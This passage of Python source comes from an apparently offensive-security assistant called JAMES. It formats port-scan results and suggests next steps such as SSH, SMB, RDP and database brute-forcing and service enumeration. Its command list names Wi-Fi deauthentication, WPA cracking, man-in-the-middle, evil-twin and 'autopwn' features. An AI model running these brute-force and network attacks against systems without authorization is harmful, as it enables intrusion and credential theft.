    def _format_scan(self, result: dict, target: str, scan_type: str) -> str:
        if "error" in result:
            return f"[!] Scan failed: {result['error']}"
        hosts = result.get("hosts", [])
        if not hosts:
            return f"🔍 {scan_type} scan of {target} — no hosts found."

        lines = [f"🔍 {scan_type} Scan Results — {target}\n"]
        for host in hosts:
            lines.append(f"  🖥️  {host['address']} ({host['state']})")
            ports = host.get("ports", [])
            if ports:
                for p in ports:
                    svc = p.get("service", "")
                    ver = p.get("version", "")
                    extra = f" ({ver})" if ver else ""
                    lines.append(f"      {p['port']}/{p['protocol']}  {p['state']:8s}  {svc}{extra}")
            else:
                lines.append("      (no open ports)")

        total_ports = sum(len(h.get("ports", [])) for h in hosts)
        lines.append(f"\n  Summary: {len(hosts)} host(s), {total_ports} open port(s)")

        # auto-suggest next steps
        lines.append(self._suggest_next(hosts))
        return "\n".join(lines)

    def _remember_services(self, target: str, result: dict):
        """Track discovered services/ports per target in context for smart suggestions."""
        services = self.context.setdefault("discovered_services", {})
        target_svcs = services.setdefault(target, {"ports": [], "services": []})
        scan_history = self.context.setdefault("scan_history", [])

        for host in result.get("hosts", []):
            for p in host.get("ports", []):
                port_id = f"{p['port']}/{p['protocol']}"
                if port_id not in target_svcs["ports"]:
                    target_svcs["ports"].append(port_id)
                svc = p.get("service", "")
                if svc and svc not in target_svcs["services"]:
                    target_svcs["services"].append(svc)

        scan_history.append({
            "target": target,
            "time": datetime.now().isoformat(),
            "ports_found": len(target_svcs["ports"]),
        })
        # Keep scan history manageable
        if len(scan_history) > 50:
            self.context["scan_history"] = scan_history[-50:]

    def _suggest_next(self, hosts: list) -> str:
        target = self.context.get("target", "<target>")
        suggestions = ["\n  💡 JAMES recommends:"]
        all_services = set()
        all_ports = set()
        for h in hosts:
            for p in h.get("ports", []):
                all_services.add(p.get("service", "").lower())
                all_ports.add(str(p.get("port", "")))

        # SSH
        if "ssh" in all_services or "22" in all_ports:
            suggestions.append(f"    → brute {target} ssh         ⚡ SSH brute-force")
        # Web
        if any(s in all_services for s in ("http", "https", "http-proxy")) or any(p in all_ports for p in ("80", "443", "8080", "8443")):
            web_target = f"http://{target}"
            suggestions.append(f"    → nikto {web_target}         ⚡ web vuln scan")
            suggestions.append(f"    → gobuster {web_target}      ⚡ dir brute-force")
            suggestions.append(f"    → waf detect {web_target}    ⚡ WAF detection")
            if "443" in all_ports:
                suggestions.append(f"    → ssl scan {target}          ⚡ TLS audit")
        # SMB
        if any(s in all_services for s in ("smb", "microsoft-ds", "netbios-ssn")) or "445" in all_ports:
            suggestions.append(f"    → smb enum {target}          ⚡ SMB shares/users")
            suggestions.append(f"    → brute {target} smb         ⚡ SMB brute-force")
        # FTP
        if "ftp" in all_services or "21" in all_ports:
            suggestions.append(f"    → brute {target} ftp         ⚡ FTP brute-force")
        # DNS
        if "domain" in all_services or "53" in all_ports:
            suggestions.append(f"    → dns enum {target}          ⚡ DNS zone transfer")
        # SNMP
        if "snmp" in all_services or "161" in all_ports:
            suggestions.append(f"    → ! snmpwalk -c public {target}  ⚡ SNMP enum")
        # RDP
        if "ms-wbt-server" in all_services or "3389" in all_ports:
            suggestions.append(f"    → brute {target} rdp         ⚡ RDP brute-force")
        # VNC
        if "vnc" in all_services or "5900" in all_ports:
            suggestions.append(f"    → brute {target} vnc         ⚡ VNC brute-force")
        # SMTP
        if "smtp" in all_services or "25" in all_ports:
            suggestions.append(f"    → ! smtp-user-enum -U /usr/share/wordlists/names.txt -t {target}  ⚡ SMTP enum")
        # LDAP
        if "ldap" in all_services or "389" in all_ports:
            suggestions.append(f"    → ! ldapsearch -x -H ldap://{target} -b '' -s base  ⚡ LDAP enum")
        # DB
        if "mysql" in all_services or "3306" in all_ports:
            suggestions.append(f"    → brute {target} mysql       ⚡ MySQL brute-force")
        if "postgresql" in all_services or "5432" in all_ports:
            suggestions.append(f"    → brute {target} postgres    ⚡ Postgres brute-force")
        # Redis / Mongo
        if "6379" in all_ports:
            suggestions.append(f"    → ! redis-cli -h {target} INFO  ⚡ Redis enum")
        if "27017" in all_ports:
            suggestions.append(f"    → ! mongosh {target} --eval 'db.adminCommand({{listDatabases:1}})'  ⚡ MongoDB enum")

        if len(suggestions) == 1:
            suggestions.append(f"    → full scan {target}         ⚡ deeper enumeration")
            suggestions.append(f"    → osint {target}             ⚡ OSINT recon")

        # Cap at 6 suggestions
        if len(suggestions) > 7:
            suggestions = suggestions[:7]
        return "\n".join(suggestions)

    def _fallback(self, text: str) -> str:
        # Check if it looks like a target/IP or CIDR
        if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", text):
            self.context["target"] = text
            return f"🎯 Target set: {text}\n    Try: scan {text}"

        # Check if it looks like a domain
        if re.match(r"^[a-z0-9-]+\.[a-z]{2,}", text, re.I):
            self.context["domain"] = text
            self.context["target"] = text
            return f"🎯 Domain set: {text}\n    Try: osint {text}  or  scan {text}"

        # Fuzzy suggestion
        suggestion = self._fuzzy_suggest(text)
        if suggestion:
            return (
                f"🤔 I didn't quite understand: \"{text}\"\n\n"
                f"    Did you mean: {suggestion}\n\n"
                "    Type 'help' for the full command list."
            )

        return (
            f"🤔 I didn't understand: \"{text}\"\n\n"
            "    Type 'help' to see available commands.\n"
            "    Or use '! <command>' to run a shell command directly."
        )


    # ── fuzzy command suggestion ─────────────────────────────────

    _KNOWN_COMMANDS = [
        ("scan",      "scan <IP/range>"),
        ("nmap",      "scan <IP/range>"),
        ("full scan", "full scan <IP/range>"),
        ("recon",     "scan <IP/range>"),
        ("osint",     "osint <domain>"),
        ("whois",     "whois <domain>"),
        ("dns",       "dns enum <domain>"),
        ("wifi",      "list interfaces"),
        ("wireless",  "list interfaces"),
        ("interface", "list interfaces"),
        ("monitor",   "enable monitor <iface>"),
        ("deauth",    "deauth <BSSID>"),
        ("crack",     "crack wpa <file>"),
        ("hashcat",   "crack hash <file>"),
        ("brute",     "brute <target>"),
        ("hydra",     "brute <target> <proto>"),
        ("sqlmap",    "sqlmap <url>"),
        ("nikto",     "nikto <url>"),
        ("gobuster",  "gobuster <url>"),
        ("mitm",      "mitm <victim> <gateway>"),
        ("arp",       "arp scan"),
        ("arp scan",  "arp scan"),
        ("responder", "responder <iface>"),
        ("smb",       "smb enum <target>"),
        ("enum4linux","smb enum <target>"),
        ("dns",       "dns lookup <domain>"),
        ("nslookup",  "dns lookup <domain>"),
        ("resolve",   "dns lookup <domain>"),
        ("skill",     "list skills"),
        ("run",       "run skill <name>"),
        ("status",    "status"),
        ("check",     "status"),
        ("report",    "report"),
        ("history",   "history"),
        ("autopwn",   "autopwn <iface>"),
        ("masscan",   "masscan <target>"),
        ("blitz",     "wifi blitz <iface>"),
        ("dominate",  "network dominate <target>"),
        ("web pwn",   "web pwn <url>"),
        ("stealth",   "stealth recon <target>"),
        ("evil twin", "evil twin <iface>"),
        ("oneclick",  "wifi blitz / network dominate / web pwn / stealth recon"),
        ("open wifi", "connect open wifi"),
        ("need wifi", "connect open wifi"),
        ("loot",      "show loot"),
        ("keys",      "show loot"),
        ("cracked",   "show loot"),
        ("aps",       "scan aps <iface>"),
        ("nearby",    "scan aps <iface>"),
        ("networks",  "scan aps <iface>"),
        ("wordlist",  "list wordlists / set wordlist <path>"),
        ("dict",      "list wordlists"),
        ("kill james", "kill james"),
        ("stop all",   "kill james"),
        ("cleanup",    "kill james"),
        ("restore",    "kill james"),
        ("fix wifi",   "kill james"),
        ("discover",   "arp scan"),
        ("hosts",      "arp scan"),
        ("sniff",      "sniff <iface>"),
        ("packet",     "sniff <iface>"),
    ]

    def _fuzzy_suggest(self, text: str) -> str:
        """Return the best matching command hint for the given free text."""
        words = set(text.lower().split())
        best_cmd = None
        best_score = 0
        for keyword, suggestion in self._KNOWN_COMMANDS:
            kw_words = set(keyword.lower().split())
            score = len(words & kw_words)
            if score == 0:
                for w in words:
                    if w in keyword or keyword in w:
                        score = 1
                        break
            if score > best_score:
                best_score = score
                best_cmd = f"`{suggestion}`"
        return best_cmd if best_score > 0 else None
